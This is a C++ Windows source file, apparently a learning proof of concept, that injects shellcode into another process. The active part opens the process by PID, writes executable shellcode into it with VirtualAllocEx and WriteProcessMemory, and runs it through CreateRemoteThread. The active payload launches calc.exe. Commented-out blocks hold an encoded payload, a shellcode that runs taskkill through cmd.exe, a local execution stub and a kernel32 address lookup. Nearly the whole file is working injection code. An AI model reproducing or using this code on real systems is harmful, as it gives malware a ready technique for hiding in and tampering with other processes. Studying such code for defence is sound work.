#include "Windows.h"
#include <iostream>
#include <cstdio>
#include <string>

int main(int argc, char *argv[]){
	//std::string shellcode2 = "\x31\xc9\x51\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe0\x41\x51\x50\xbb\xAA\xAA\xAA\xAA\xff\xd3\x31\xc0\x50\xb8\xBB\xBB\xBB\xBB\xff\xe0";
	//unsigned char shellcode[] = "\x31\xc9\x51\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe0\x41\x51\x50\xbb\x2e\xf5\xbb\x75\xff\xd3\xc3";
	unsigned char shellcode[] = "\x31\xc9\x51\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe0\x41\x51\x50\xbb\x2e\xf5\xbb\x75\xff\xd3\x31\xc0\x50\xb8\x8a\xbe\xb8\x75\xff\xe0";
	
	/*
	unsigned char shellcode[] = 
		"\xdb\xd8\xd9\x74\x24\xf4\xb8\x1b\x18\x96\x2a\x5e\x2b\xc9"
		"\xb1\x52\x83\xc6\x04\x31\x46\x13\x03\x5d\x0b\x74\xdf\x9d"
		"\xc3\xfa\x20\x5d\x14\x9b\xa9\xb8\x25\x9b\xce\xc9\x16\x2b"
		"\x84\x9f\x9a\xc0\xc8\x0b\x28\xa4\xc4\x3c\x99\x03\x33\x73"
		"\x1a\x3f\x07\x12\x98\x42\x54\xf4\xa1\x8c\xa9\xf5\xe6\xf1"
		"\x40\xa7\xbf\x7e\xf6\x57\xcb\xcb\xcb\xdc\x87\xda\x4b\x01"
		"\x5f\xdc\x7a\x94\xeb\x87\x5c\x17\x3f\xbc\xd4\x0f\x5c\xf9"
		"\xaf\xa4\x96\x75\x2e\x6c\xe7\x76\x9d\x51\xc7\x84\xdf\x96"
		"\xe0\x76\xaa\xee\x12\x0a\xad\x35\x68\xd0\x38\xad\xca\x93"
		"\x9b\x09\xea\x70\x7d\xda\xe0\x3d\x09\x84\xe4\xc0\xde\xbf"
		"\x11\x48\xe1\x6f\x90\x0a\xc6\xab\xf8\xc9\x67\xea\xa4\xbc"
		"\x98\xec\x06\x60\x3d\x67\xaa\x75\x4c\x2a\xa3\xba\x7d\xd4"
		"\x33\xd5\xf6\xa7\x01\x7a\xad\x2f\x2a\xf3\x6b\xa8\x4d\x2e"
		"\xcb\x26\xb0\xd1\x2c\x6f\x77\x85\x7c\x07\x5e\xa6\x16\xd7"
		"\x5f\x73\xb8\x87\xcf\x2c\x79\x77\xb0\x9c\x11\x9d\x3f\xc2"
		"\x02\x9e\x95\x6b\xa8\x65\x7e\x9e\xe6\xaf\xc9\xf6\xfa\x2f"
		"\x37\xbc\x72\xc9\x5d\xd2\xd2\x42\xca\x4b\x7f\x18\x6b\x93"
		"\x55\x65\xab\x1f\x5a\x9a\x62\xe8\x17\x88\x13\x18\x62\xf2"
		"\xb2\x27\x58\x9a\x59\xb5\x07\x5a\x17\xa6\x9f\x0d\x70\x18"
		"\xd6\xdb\x6c\x03\x40\xf9\x6c\xd5\xab\xb9\xaa\x26\x35\x40"
		"\x3e\x12\x11\x52\x86\x9b\x1d\x06\x56\xca\xcb\xf0\x10\xa4"
		"\xbd\xaa\xca\x1b\x14\x3a\x8a\x57\xa7\x3c\x93\xbd\x51\xa0"
		"\x22\x68\x24\xdf\x8b\xfc\xa0\x98\xf1\x9c\x4f\x73\xb2\xad"
		"\x05\xd9\x93\x25\xc0\x88\xa1\x2b\xf3\x67\xe5\x55\x70\x8d"
		"\x96\xa1\x68\xe4\x93\xee\x2e\x15\xee\x7f\xdb\x19\x5d\x7f"
		"\xce";
		
		
	unsigned char shellcode[] =
		"\xfc\xe8\x44\x00\x00\x00\x8b\x45\x3c\x8b\x7c\x05\x78\x01\xef\x8b" \
		"\x4f\x18\x8b\x5f\x20\x01\xeb\x49\x8b\x34\x8b\x01\xee\x31\xc0\x99" \
		"\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x3b\x54\x24\x04" \
		"\x75\xe5\x8b\x5f\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb" \
		"\x8b\x1c\x8b\x01\xeb\x89\x5c\x24\x04\xc3\x31\xc0\x64\x8b\x40\x30" \
		"\x85\xc0\x78\x0c\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x68\x08\xeb\x09" \
		"\x8b\x80\xb0\x00\x00\x00\x8b\x68\x3c\x5f\x31\xf6\x60\x56\x89\xf8" \
		"\x83\xc0\x7b\x50\x68\xef\xce\xe0\x60\x68\x98\xfe\x8a\x0e\x57\xff" \
		"\xe7\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20\x74\x61\x73\x6b" \
		"\x6b\x69\x6c\x6c\x20\x2f\x50\x49\x44\x20\x05\x40\x00\x00\x00";*/

/*	void *exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, shellcode, sizeof shellcode);
	((void(*)())exec)(); */

	
	HANDLE processHandle;
	HANDLE remoteThread;
	PVOID remoteBuffer;

	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, atoi(argv[1]));
	remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);
	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
	CloseHandle(processHandle);

	
	
	
/*	
	struct HINSTANCE__ *kernel32Addr;  		//Save the Address of Kernerl32.dll
	void (*exitProcessAddr)(char*) = 0;     //Address of the "Exit"-Process
    void (*winExecAddr)(char*) = 0;         //Address of WinExec

    kernel32Addr = GetModuleHandle("kernel32.dll");
    exitProcessAddr = (void (__cdecl *)(char *)) GetProcAddress(kernel32Addr, "ExitProcess");
    winExecAddr = (void (__cdecl *)(char *)) GetProcAddress(kernel32Addr, "WinExec");
*/

    return 0;
}
